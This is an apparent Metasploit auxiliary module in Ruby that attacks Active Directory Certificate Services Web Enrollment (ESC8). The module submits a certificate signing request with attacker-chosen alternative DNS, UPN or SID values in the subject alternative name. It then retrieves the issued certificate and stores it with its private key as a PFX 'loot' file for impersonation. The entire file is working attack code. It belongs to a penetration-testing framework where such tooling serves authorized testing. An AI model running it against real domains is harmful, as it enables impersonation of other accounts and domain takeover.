##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'AD CS Web Enrollment Certificate Issuance (ESC8)',
        'Description'    => %q{
          This module requests certificates via the AD CS Web Enrollment portal.
          It supports NTLM and Kerberos authentication via the HttpClient datastore options.
          Set HTTP::Auth to KERBEROS for pass-the-ticket style attacks.
        },
        'Author'         => [ 'Fabio Tommaselli aka kingdragone' ],
        'License'        => MSF_LICENSE,
        'References'     => [
          ['URL', 'https://posts.specterops.io/certified-pre-owned-d95910965cd2']
        ],
        'Notes'          => {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS],
          'AKA'         => ['ESC8']
        },
        'Actions'        => [
          ['REQUEST_CERT', { 'Description' => 'Request a certificate' }]
        ],
        'DefaultAction'  => 'REQUEST_CERT'
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the portal', '/certsrv/']),
      OptString.new('CERT_TEMPLATE', [true, 'The certificate template', 'User']),
      OptString.new('ALT_DNS', [false, 'Alternative certificate DNS']),
      OptString.new('ALT_UPN', [false, 'Alternative certificate UPN (format: USER@DOMAIN)']),
      OptString.new('ALT_SID', [false, 'Alternative object SID'])
    ])

    register_advanced_options([
      OptEnum.new('RSAKeySize', [ true, 'RSA key size in bits for CSR generation', '2048', %w[1024 2048 3072 4096 8192] ])
    ])
  end

  def setup
    super

    errors = {}
    if datastore['ALT_SID'].present? && datastore['ALT_SID'] !~ /^S(-\d+)+$/
      errors['ALT_SID'] = 'Must be a valid SID.'
    end

    if datastore['ALT_UPN'].present? && datastore['ALT_UPN'] !~ /^\S+@[^\s\\]+$/
      errors['ALT_UPN'] = 'Must be in the format USER@DOMAIN.'
    end

    raise OptionValidateError, errors unless errors.empty?
  end

  def run
    case action.name
    when 'REQUEST_CERT'
      action_request_cert
    else
      print_error("Unknown action: #{action.name}")
    end
  end

  private

  def action_request_cert
    private_key, csr_pem = generate_csr

    cert_attribs = ["CertificateTemplate:#{datastore['CERT_TEMPLATE']}"]
    san_values = []
    san_values << "dns=#{datastore['ALT_DNS']}" if datastore['ALT_DNS'].present?
    san_values << "upn=#{datastore['ALT_UPN']}" if datastore['ALT_UPN'].present?

    if datastore['ALT_SID'].present?
      san_values << "url=tag:microsoft.com,2022-09-14:sid:#{datastore['ALT_SID']}"
      san_values << "url=#{datastore['ALT_SID']}"
    end

    cert_attribs << "SAN:#{san_values.join('&')}" unless san_values.empty?

    params = {
      'Mode'           => 'newreq',
      'CertRequest'    => csr_pem,
      'CertAttrib'     => cert_attribs.join("\n"),
      'TargetStoreFlags' => '0',
      'SaveCert'       => 'yes'
    }

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(datastore['TARGETURI'], 'certfnsh.asp'),
      'vars_post' => params
    )

    if res.nil?
      fail_with(Failure::Unreachable, 'No response from the AD CS Web Enrollment portal.')
    end

    if res.code == 200 && res.body =~ /request\s+was\s+denied/i
      fail_with(Failure::NoAccess, 'Certificate request was denied. Verify template permissions and enrollment rights.')
    end

    if res.code == 200 && res.body =~ /certificate\s+pending/i
      print_warning('Certificate request submitted but pending approval.')
      return
    end

    req_id = parse_req_id(res.body)
    if req_id
      print_good("Request ID #{req_id} received.")
      download_and_save(req_id, private_key)
    else
      fail_with(Failure::UnexpectedReply, 'Could not find a certificate request ID in the response.')
    end
  end

  def parse_req_id(body)
    return nil unless body

    matches = body.match(/certnew\.cer\?ReqID=(\d+)/i)
    return matches[1] if matches

    nil
  end

  def generate_csr
    key = OpenSSL::PKey::RSA.new(datastore['RSAKeySize'].to_i)
    request = Rex::Proto::X509::Request.create_csr(key, datastore['HttpUsername'].presence || 'MSF-Request')
    [key, request.to_pem]
  end

  def download_and_save(req_id, private_key)
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(datastore['TARGETURI'], 'certnew.cer'),
      'vars_get' => { 'ReqID' => req_id, 'Enc' => 'b64' }
    )

    if res.nil?
      fail_with(Failure::Unreachable, 'No response while downloading the issued certificate.')
    end

    if res.code != 200
      fail_with(Failure::UnexpectedReply, "Unexpected status code while downloading certificate: #{res.code}")
    end

    cert_body = res.body.to_s
    unless cert_body.include?('BEGIN CERTIFICATE')
      base64_data = cert_body.gsub(/\s+/, '')
      cert_der = Rex::Text.decode_base64(base64_data)
      cert_body = OpenSSL::X509::Certificate.new(cert_der).to_pem
    end

    cert = OpenSSL::X509::Certificate.new(cert_body)
    pfx = OpenSSL::PKCS12.create('', datastore['CERT_TEMPLATE'], private_key, cert)

    path = store_loot('windows.ad.cs', 'application/x-pkcs12', datastore['RHOST'], pfx.to_der, 'certificate.pfx')
    print_good("PFX saved to: #{path}")
  end
end